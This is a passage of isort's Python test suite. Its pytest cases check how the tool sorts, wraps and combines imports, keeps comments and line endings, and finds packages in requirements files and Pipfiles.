def test_long_single_line():
    """"""Test to ensure long single lines get handled correctly""""""
    output = SortImports(file_contents=""from ..views import (""
                                       "" _a,""
                                       ""_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)"",
                         line_length=79).output
    for line in output.split('\n'):
        assert len(line) <= 79

    output = SortImports(file_contents=""from ..views import (""
                                       "" _a,""
                                       ""_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)"",
                         line_length=76, combine_as_imports=True).output
    for line in output.split('\n'):
        assert len(line) <= 79


def test_import_inside_class_issue_432():
    """"""Test to ensure issue 432 is resolved and isort doesn't insert imports in the middle of classes""""""
    test_input = (""# coding=utf-8\n""
                  ""class Foo:\n""
                  ""    def bar(self):\n""
                  ""        pass\n"")
    expected_output = (""# coding=utf-8\n""
                       ""import baz\n""
                       ""\n""
                       ""\n""
                       ""class Foo:\n""
                       ""    def bar(self):\n""
                       ""        pass\n"")
    assert SortImports(file_contents=test_input, add_imports=['import baz']).output == expected_output


def test_wildcard_import_without_space_issue_496():
    """"""Test to ensure issue #496: wildcard without space, is resolved""""""
    test_input = 'from findorserver.coupon.models import*'
    expected_output = 'from findorserver.coupon.models import *\n'
    assert SortImports(file_contents=test_input).output == expected_output


def test_import_line_mangles_issues_491():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('import os  # ([\n'
                  '\n'
                  'print(""hi"")\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_import_line_mangles_issues_505():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('from sys import *  # (\n'
                  '\n'
                  '\n'
                  'def test():\n'
                  '    print(""Test print"")\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_import_line_mangles_issues_439():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('import a  # () import\n'
                  'from b import b\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_alias_using_paren_issue_466():
    """"""Test to ensure issue #466: Alias causes slash incorrectly is resolved""""""
    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\n'
    expected_output = ('from django.db.backends.mysql.base import (\n'
                       '    DatabaseWrapper as MySQLDatabaseWrapper)\n')
    assert SortImports(file_contents=test_input, line_length=50, use_parentheses=True).output == expected_output

    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\n'
    expected_output = ('from django.db.backends.mysql.base import (\n'
                       '    DatabaseWrapper as MySQLDatabaseWrapper\n'
                       ')\n')
    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                       use_parentheses=True).output == expected_output


def test_long_alias_using_paren_issue_957():
    test_input = ('from package import module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from package import (\n'
                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output

    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\n'
                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output

    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\n'
                       '    very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output


def test_strict_whitespace_by_default(capsys):
    test_input = ('import os\n'
                  'from django.conf import settings\n')
    SortImports(file_contents=test_input, check=True)
    out, err = capsys.readouterr()
    assert out == 'ERROR:  Imports are incorrectly sorted.\n'


def test_strict_whitespace_no_closing_newline_issue_676(capsys):
    test_input = ('import os\n'
                  '\n'
                  'from django.conf import settings\n'
                  '\n'
                  'print(1)')
    SortImports(file_contents=test_input, check=True)
    out, err = capsys.readouterr()
    assert out == ''


def test_ignore_whitespace(capsys):
    test_input = ('import os\n'
                  'from django.conf import settings\n')
    SortImports(file_contents=test_input, check=True, ignore_whitespace=True)
    out, err = capsys.readouterr()
    assert out == ''


def test_import_wraps_with_comment_issue_471():
    """"""Test to ensure issue #471 is resolved""""""
    test_input = ('from very_long_module_name import SuperLongClassName  #@UnusedImport'
                  ' -- long string of comments which wrap over')
    expected_output = ('from very_long_module_name import (\n'
                       '    SuperLongClassName)  # @UnusedImport -- long string of comments which wrap over\n')
    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=1,
                       use_parentheses=True).output == expected_output


def test_import_case_produces_inconsistent_results_issue_472():
    """"""Test to ensure sorting imports with same name but different case produces the same result across platforms""""""
    test_input = ('from sqlalchemy.dialects.postgresql import ARRAY\n'
                  'from sqlalchemy.dialects.postgresql import array\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input

    test_input = 'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n'
    assert SortImports(file_contents=test_input).output == test_input


def test_inconsistent_behavior_in_python_2_and_3_issue_479():
    """"""Test to ensure Python 2 and 3 have the same behavior""""""
    test_input = ('from future.standard_library import hooks\n'
                  'from workalendar.europe import UnitedKingdom\n')
    assert SortImports(file_contents=test_input,
                       known_first_party=[""future""]).output == test_input


def test_sort_within_section_comments_issue_436():
    """"""Test to ensure sort within sections leaves comments untouched""""""
    test_input = ('import os.path\n'
                  'import re\n'
                  '\n'
                  '# report.py exists in ... comment line 1\n'
                  '# this file needs to ...  comment line 2\n'
                  '# it must not be ...      comment line 3\n'
                  'import report\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input


def test_sort_within_sections_with_force_to_top_issue_473():
    """"""Test to ensure it's possible to sort within sections with items forced to top""""""
    test_input = ('import z\n'
                  'import foo\n'
                  'from foo import bar\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True,
                       force_to_top=['z']).output == test_input


def test_correct_number_of_new_lines_with_comment_issue_435():
    """"""Test to ensure that injecting a comment in-between imports doesn't mess up the new line spacing""""""
    test_input = ('import foo\n'
                  '\n'
                  '# comment\n'
                  '\n'
                  '\n'
                  'def baz():\n'
                  '    pass\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_future_below_encoding_issue_545():
    """"""Test to ensure future is always below comment""""""
    test_input = ('#!/usr/bin/env python\n'
                  'from __future__ import print_function\n'
                  'import logging\n'
                  '\n'
                  'print(""hello"")\n')
    expected_output = ('#!/usr/bin/env python\n'
                       'from __future__ import print_function\n'
                       '\n'
                       'import logging\n'
                       '\n'
                       'print(""hello"")\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_no_extra_lines_issue_557():
    """"""Test to ensure no extra lines are prepended""""""
    test_input = ('import os\n'
                  '\n'
                  'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n')
    expected_output = ('import os\n'
                       'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n')
    assert SortImports(file_contents=test_input, force_alphabetical_sort=True,
                       force_sort_within_sections=True).output == expected_output


def test_long_import_wrap_support_with_mode_2():
    """"""Test to ensure mode 2 still allows wrapped imports with slash""""""
    test_input = ('from foobar.foobar.foobar.foobar import \\\n'
                  '    an_even_longer_function_name_over_80_characters\n')
    assert SortImports(file_contents=test_input, multi_line_output=WrapModes.HANGING_INDENT,
                       line_length=80).output == test_input


def test_pylint_comments_incorrectly_wrapped_issue_571():
    """"""Test to ensure pylint comments don't get wrapped""""""
    test_input = ('from PyQt5.QtCore import QRegExp  # @UnresolvedImport pylint: disable=import-error,'
                  'useless-suppression\n')
    expected_output = ('from PyQt5.QtCore import \\\n'
                       '    QRegExp  # @UnresolvedImport pylint: disable=import-error,useless-suppression\n')
    assert SortImports(file_contents=test_input, line_length=60).output == expected_output


def test_ensure_async_methods_work_issue_537():
    """"""Test to ensure async methods are correctly identified""""""
    test_input = ('from myapp import myfunction\n'
                  '\n'
                  '\n'
                  'async def test_myfunction(test_client, app):\n'
                  '    a = await myfunction(test_client, app)\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_ensure_as_imports_sort_correctly_within_from_imports_issue_590():
    """"""Test to ensure combination from and as import statements are sorted correct""""""
    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input

    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input


def test_ensure_line_endings_are_preserved_issue_493():
    """"""Test to ensure line endings are not converted""""""
    test_input = ('from os import defpath\r\n'
                  'from os import pathsep as separator\r\n')
    assert SortImports(file_contents=test_input).output == test_input
    test_input = ('from os import defpath\r'
                  'from os import pathsep as separator\r')
    assert SortImports(file_contents=test_input).output == test_input
    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_not_splitted_sections():
    whiteline = '\n'
    stdlib_section = 'import unittest\n'
    firstparty_section = 'from app.pkg1 import mdl1\n'
    local_section = 'from .pkg2 import mdl2\n'
    statement = 'foo = bar\n'
    test_input = (
        stdlib_section + whiteline + firstparty_section + whiteline +
        local_section + whiteline + statement
    )

    assert SortImports(file_contents=test_input).output == test_input
    assert SortImports(file_contents=test_input, no_lines_before=['LOCALFOLDER']).output == \
           (
               stdlib_section + whiteline + firstparty_section + local_section +
               whiteline + statement
           )
    # by default STDLIB and FIRSTPARTY sections are split by THIRDPARTY section,
    # so don't merge them if THIRDPARTY imports aren't exist
    assert SortImports(file_contents=test_input, no_lines_before=['FIRSTPARTY']).output == test_input
    # in case when THIRDPARTY section is excluded from sections list, it's ok to merge STDLIB and FIRSTPARTY
    assert SortImports(
        file_contents=test_input,
        sections=['STDLIB', 'FIRSTPARTY', 'LOCALFOLDER'],
        no_lines_before=['FIRSTPARTY'],
    ).output == (
        stdlib_section + firstparty_section + whiteline + local_section +
        whiteline + statement
    )
    # it doesn't change output, because stdlib packages don't have any whitelines before them
    assert SortImports(file_contents=test_input, no_lines_before=['STDLIB']).output == test_input


def test_no_lines_before_empty_section():
    test_input = ('import first\n'
                  'import custom\n')
    assert SortImports(
        file_contents=test_input,
        known_third_party=[""first""],
        known_custom=[""custom""],
        sections=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],
        no_lines_before=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],
    ).output == test_input


def test_no_inline_sort():
    """"""Test to ensure multiple `from` imports in one line are not sorted if `--no-inline-sort` flag
    is enabled. If `--force-single-line-imports` flag is enabled, then `--no-inline-sort` is ignored.""""""
    test_input = 'from foo import a, c, b\n'
    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=False).output == test_input
    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=False).output == 'from foo import a, b, c\n'
    expected = (
        'from foo import a\n'
        'from foo import b\n'
        'from foo import c\n'
    )
    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=True).output == expected
    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=True).output == expected


def test_relative_import_of_a_module():
    """"""Imports can be dynamically created (PEP302) and is used by modules such as six.  This test ensures that
    these types of imports are still sorted to the correct type instead of being categorized as local.""""""
    test_input = ('from __future__ import absolute_import\n'
                  '\n'
                  'import itertools\n'
                  '\n'
                  'from six import add_metaclass\n'
                  '\n'
                  'from six.moves import asd\n'
                  )

    expected_results = ('from __future__ import absolute_import\n'
                        '\n'
                        'import itertools\n'
                        '\n'
                        'from six import add_metaclass\n'
                        'from six.moves import asd\n'
                        )

    sorted_result = SortImports(file_contents=test_input, force_single_line=True).output
    assert sorted_result == expected_results


def test_escaped_parens_sort():
    test_input = ('from foo import \\ \n'
                  '(a,\n'
                  'b,\n'
                  'c)\n')
    expected = ('from foo import a, b, c\n')
    assert SortImports(file_contents=test_input).output == expected


def test_is_python_file_ioerror(tmpdir):
    does_not_exist = tmpdir.join('fake.txt')
    assert is_python_file(str(does_not_exist)) is False


def test_is_python_file_shebang(tmpdir):
    path = tmpdir.join('myscript')
    path.write('#!/usr/bin/env python\n')
    assert is_python_file(str(path)) is True


def test_is_python_file_editor_backup(tmpdir):
    path = tmpdir.join('myscript~')
    path.write('#!/usr/bin/env python\n')
    assert is_python_file(str(path)) is False


def test_is_python_typing_stub(tmpdir):
    stub = tmpdir.join('stub.pyi')
    assert is_python_file(str(stub)) is True


def test_to_ensure_imports_are_brought_to_top_issue_651():
    test_input = ('from __future__ import absolute_import, unicode_literals\n'
                  '\n'
                  'VAR = """"""\n'
                  'multiline text\n'
                  '""""""\n'
                  '\n'
                  'from __future__ import unicode_literals\n'
                  'from __future__ import absolute_import\n')
    expected_output = ('from __future__ import absolute_import, unicode_literals\n'
                       '\n'
                       'VAR = """"""\n'
                       'multiline text\n'
                       '""""""\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_to_ensure_importing_from_imports_module_works_issue_662():
    test_input = ('@wraps(fun)\n'
                  'def __inner(*args, **kwargs):\n'
                  '    from .imports import qualname\n'
                  '    warn(description=description or qualname(fun), deprecation=deprecation, removal=removal)\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_no_unexpected_changes_issue_666():
    test_input = ('from django.conf import settings\n'
                  'from django.core.management import call_command\n'
                  'from django.core.management.base import BaseCommand\n'
                  'from django.utils.translation import ugettext_lazy as _\n'
                  '\n'
                  'TEMPLATE = """"""\n'
                  '# This file is generated automatically with the management command\n'
                  '#\n'
                  '#    manage.py bis_compile_i18n\n'
                  '#\n'
                  '# please dont change it manually.\n'
                  'from django.utils.translation import ugettext_lazy as _\n'
                  '""""""\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_tabs_dont_become_space_issue_665():
    test_input = ('import os\n'
                  '\n'
                  '\n'
                  'def my_method():\n'
                  '\tpass\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_new_lines_are_preserved():
    with NamedTemporaryFile('w', suffix='py', delete=False) as rn_newline:
        pass

    try:
        with io.open(rn_newline.name, mode='w', newline='') as rn_newline_input:
            rn_newline_input.write('import sys\r\nimport os\r\n')

        SortImports(rn_newline.name, settings_path=os.getcwd())
        with io.open(rn_newline.name) as new_line_file:
            print(new_line_file.read())
        with io.open(rn_newline.name, newline='') as rn_newline_file:
            rn_newline_contents = rn_newline_file.read()
        assert rn_newline_contents == 'import os\r\nimport sys\r\n'
    finally:
        os.remove(rn_newline.name)

    with NamedTemporaryFile('w', suffix='py', delete=False) as r_newline:
        pass

    try:
        with io.open(r_newline.name, mode='w', newline='') as r_newline_input:
            r_newline_input.write('import sys\rimport os\r')

        SortImports(r_newline.name, settings_path=os.getcwd())
        with io.open(r_newline.name, newline='') as r_newline_file:
            r_newline_contents = r_newline_file.read()
        assert r_newline_contents == 'import os\rimport sys\r'
    finally:
        os.remove(r_newline.name)

    with NamedTemporaryFile('w', suffix='py', delete=False) as n_newline:
        pass

    try:
        with io.open(n_newline.name, mode='w', newline='') as n_newline_input:
            n_newline_input.write('import sys\nimport os\n')

        SortImports(n_newline.name, settings_path=os.getcwd())
        with io.open(n_newline.name, newline='') as n_newline_file:
            n_newline_contents = n_newline_file.read()
        assert n_newline_contents == 'import os\nimport sys\n'
    finally:
        os.remove(n_newline.name)


def test_requirements_finder(tmpdir):
    subdir = tmpdir.mkdir('subdir').join(""lol.txt"")
    subdir.write(""flask"")
    req_file = tmpdir.join('requirements.txt')
    req_file.write(
        ""Django==1.11\n""
        ""-e git+https://github.com/orsinium/deal.git#egg=deal\n""
    )
    si = SortImports(file_contents="""")
    for path in (str(tmpdir), str(subdir)):
        finder = finders.RequirementsFinder(
            config=si.config,
            sections=si.sections,
            path=path
        )

        files = list(finder._get_files())
        assert len(files) == 1  # file finding
        assert files[0].endswith('requirements.txt')  # file finding
        assert set(finder._get_names(str(req_file))) == {'Django', 'deal'}  # file parsing

        assert finder.find(""django"") == si.sections.THIRDPARTY  # package in reqs
        assert finder.find(""flask"") is None  # package not in reqs
        assert finder.find(""deal"") == si.sections.THIRDPARTY  # vcs

        assert len(finder.mapping) > 100
        assert finder._normalize_name('deal') == 'deal'
        assert finder._normalize_name('Django') == 'django'  # lowercase
        assert finder._normalize_name('django_haystack') == 'haystack'  # mapping
        assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`

    req_file.remove()


def test_forced_separate_is_deterministic_issue_774(tmpdir):

    config_file = tmpdir.join('setup.cfg')
    config_file.write(
        ""[isort]\n""
        ""forced_separate:\n""
        ""   separate1\n""
        ""   separate2\n""
        ""   separate3\n""
        ""   separate4\n""
    )

    test_input = ('import time\n'
                  '\n'
                  'from separate1 import foo\n'
                  '\n'
                  'from separate2 import bar\n'
                  '\n'
                  'from separate3 import baz\n'
                  '\n'
                  'from separate4 import quux\n')

    assert SortImports(file_contents=test_input, settings_path=config_file.strpath).output == test_input


PIPFILE = """"""
[[source]]
url = ""https://pypi.org/simple""
verify_ssl = true
name = ""pypi""

[requires]
python_version = ""3.5""

[packages]
Django = ""~=1.11""
deal = {editable = true, git = ""https://github.com/orsinium/deal.git""}

[dev-packages]
""""""


def test_pipfile_finder(tmpdir):
    pipfile = tmpdir.join('Pipfile')
    pipfile.write(PIPFILE)
    si = SortImports(file_contents="""")
    finder = finders.PipfileFinder(
        config=si.config,
        sections=si.sections,
        path=str(tmpdir)
    )

    assert set(finder._get_names(str(tmpdir))) == {'Django', 'deal'}  # file parsing

    assert finder.find(""django"") == si.sections.THIRDPARTY  # package in reqs
    assert finder.find(""flask"") is None  # package not in reqs
    assert finder.find(""deal"") == si.sections.THIRDPARTY  # vcs

    assert len(finder.mapping) > 100
    assert finder._normalize_name('deal') == 'deal'
    assert finder._normalize_name('Django') == 'django'  # lowercase
    assert finder._normalize_name('django_haystack') == 'haystack'  # mapping
    assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`

    pipfile.remove()


def test_monkey_patched_urllib():
    with pytest.raises(ImportError):
        # Previous versions of isort monkey patched urllib which caused unusual
        # importing for other projects.
        from urllib import quote  # type: ignore  # noqa: F401


def test_path_finder(monkeypatch):
    si = SortImports(file_contents="""")
    finder = finders.PathFinder(
        config=si.config,
        sections=si.sections,
    )
    third_party_prefix = next(path for path in finder.paths if ""site-packages"" in path)
    ext_suffix = sysconfig.get_config_var(""EXT_SUFFIX"") or "".so""
    imaginary_paths = set([
        posixpath.join(finder.stdlib_lib_prefix, ""example_1.py""),
        posixpath.join(third_party_prefix, ""example_2.py""),
        posixpath.join(third_party_prefix, ""example_3.so""),
        posixpath.join(third_party_prefix, ""example_4"" + ext_suffix),
        posixpath.join(os.getcwd(), ""example_5.py""),
    ])
    monkeypatch.setattr(""isort.finders.exists_case_sensitive"", lambda p: p in imaginary_paths)
    assert finder.find(""example_1"") == finder.sections.STDLIB
    assert finder.find(""example_2"") == finder.sections.THIRDPARTY
    assert finder.find(""example_3"") == finder.sections.THIRDPARTY
    assert finder.find(""example_4"") == finder.sections.THIRDPARTY
    assert finder.find(""example_5"") == finder.sections.FIRSTPARTY


def test_argument_parsing():
    from isort.main import parse_args
    args = parse_args(['-dt', '-t', 'foo', '--skip=bar', 'baz.py'])
    assert args['order_by_type'] is False
    assert args['force_to_top'] == ['foo']
    assert args['skip'] == ['bar']
    assert args['files'] == ['baz.py']


@pytest.mark.parametrize('multiprocess', (False, True))
def test_command_line(tmpdir, capfd, multiprocess):
    from isort.main import main
    tmpdir.join(""file1.py"").write(""import re\nimport os\n\nimport contextlib\n\n\nimport isort"")
    tmpdir.join(""file2.py"").write(""import collections\nimport time\n\nimport abc\n\n\nimport isort"")
    arguments = [""-rc"", str(tmpdir), '--settings-path', os.getcwd()]
    if multiprocess:
        arguments.extend(['--jobs', '2'])
    main(arguments)
    assert tmpdir.join(""file1.py"").read() == ""import contextlib\nimport os\nimport re\n\nimport isort\n""
    assert tmpdir.join(""file2.py"").read() == ""import abc\nimport collections\nimport time\n\nimport isort\n""
    if not sys.platform.startswith('win'):
        out, err = capfd.readouterr()
        assert not err
        # it informs us about fixing the files:
        assert str(tmpdir.join(""file1.py"")) in out
        assert str(tmpdir.join(""file2.py"")) in out


@pytest.mark.parametrize(""quiet"", (False, True))
def test_quiet(tmpdir, capfd, quiet):
    if sys.platform.startswith(""win""):
        return
    from isort.main import main
    tmpdir.join(""file1.py"").write(""import re\nimport os"")
    tmpdir.join(""file2.py"").write("""")
    arguments = [""-rc"", str(tmpdir)]
    if quiet:
        arguments.append(""-q"")
    main(arguments)
    out, err = capfd.readouterr()
    assert not err
    assert bool(out) != quiet


@pytest.mark.parametrize('enabled', (False, True))
def test_safety_excludes(tmpdir, enabled):
    tmpdir.join(""victim.py"").write(""# ..."")
    toxdir = tmpdir.mkdir("".tox"")
    toxdir.join(""verysafe.py"").write(""# ..."")
    tmpdir.mkdir(""lib"").mkdir(""python3.7"").join(""importantsystemlibrary.py"").write(""# ..."")
    tmpdir.mkdir("".pants.d"").join(""pants.py"").write(""import os"")
    config = dict(settings.default.copy(), safety_excludes=enabled)
    skipped = []  # type: List[str]
    codes = [str(tmpdir)]
    main.iter_source_code(codes, config, skipped)

    # if enabled files within nested unsafe directories should be skipped
    file_names = set(os.path.relpath(f, str(tmpdir)) for f in main.iter_source_code([str(tmpdir)], config, skipped))
    if enabled:
        assert file_names == {'victim.py'}
        assert len(skipped) == 3
    else:
        assert file_names == {os.sep.join(('.tox', 'verysafe.py')),
                              os.sep.join(('lib', 'python3.7', 'importantsystemlibrary.py')),
                              os.sep.join(('.pants.d', 'pants.py')),
                              'victim.py'}
        assert not skipped

    # directly pointing to files within unsafe directories shouldn't skip them either way
    file_names = set(os.path.relpath(f, str(toxdir)) for f in main.iter_source_code([str(toxdir)], config, skipped))
    assert file_names == {'verysafe.py'}


@pytest.mark.parametrize('skip_glob_assert', (([], 0, {os.sep.join(('code', 'file.py'))}), (['**/*.py'], 1, {}),
                                              (['*/code/*.py'], 1, {})))
def test_skip_glob(tmpdir, skip_glob_assert):
    skip_glob, skipped_count, file_names = skip_glob_assert
    base_dir = tmpdir.mkdir('build')
    code_dir = base_dir.mkdir('code')
    code_dir.join('file.py').write('import os')

    config = dict(settings.default.copy(), skip_glob=skip_glob)
    skipped = []  # type: List[str]
    file_names = set(os.path.relpath(f, str(base_dir)) for f in main.iter_source_code([str(base_dir)], config, skipped))
    assert len(skipped) == skipped_count
    assert file_names == file_names


def test_comments_not_removed_issue_576():
    test_input = ('import distutils\n'
                  '# this comment is important and should not be removed\n'
                  'from sys import api_version as api_version\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_reverse_relative_imports_issue_417():
    test_input = ('from . import ipsum\n'
                  'from . import lorem\n'
                  'from .dolor import consecteur\n'
                  'from .sit import apidiscing\n'
                  'from .. import donec\n'
                  'from .. import euismod\n'
                  'from ..mi import iaculis\n'
                  'from ..nec import tempor\n'
                  'from ... import diam\n'
                  'from ... import dui\n'
                  'from ...eu import dignissim\n'
                  'from ...ex import metus\n')
    assert SortImports(file_contents=test_input,
                       force_single_line=True,
                       reverse_relative=True).output == test_input


def test_inconsistent_relative_imports_issue_577():
    test_input = ('from ... import diam\n'
                  'from ... import dui\n'
                  'from ...eu import dignissim\n'
                  'from ...ex import metus\n'
                  'from .. import donec\n'
                  'from .. import euismod\n'
                  'from ..mi import iaculis\n'
                  'from ..nec import tempor\n'
                  'from . import ipsum\n'
                  'from . import lorem\n'
                  'from .dolor import consecteur\n'
                  'from .sit import apidiscing\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input


def test_unwrap_issue_762():
    test_input = ('from os.path \\\n'
                  'import (join, split)\n')
    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\n'

    test_input = ('from os.\\\n'
                  '    path import (join, split)')
    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\n'


def test_multiple_as_imports():
    test_input = ('from a import b as b\n'
                  'from a import b as bb\n'
                  'from a import b as bb_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'

    test_input = ('from a import b\n'
                  'from a import b as b\n'
                  'from a import b as bb\n'
                  'from a import b as bb_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'from a import b as b\nfrom a import b as bb\nfrom a import b as bb_\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b, b as b, b as bb, b as bb_\n'

    test_input = ('from a import b as e\n'
                  'from a import b as c\n'
                  'from a import b\n'
                  'from a import b as f\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'from a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as c, b as e, b as f\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b\nfrom a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, no_inline_sort=True).output
    assert test_output == 'from a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b\nfrom a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b, b as c, b as e, b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b as e, b as c, b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b, b as e, b as c, b as f\n'

    test_input = ('import a as a\n'
                  'import a as aa\n'
                  'import a as aa_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == test_input

    test_input = ('import a\n'
                  'import a as a\n'
                  'import a as aa\n'
                  'import a as aa_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'import a as a\nimport a as aa\nimport a as aa_\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == test_input


def test_all_imports_from_single_module():
    test_input = ('import a\n'
                  'from a import *\n'
                  'from a import b as d\n'
                  'from a import z, x, y\n'
                  'from a import b\n'
                  'from a import w, i as j\n'
                  'from a import b as c, g as h\n'
                  'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c, b as d, e as f, g as h, i as j, w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
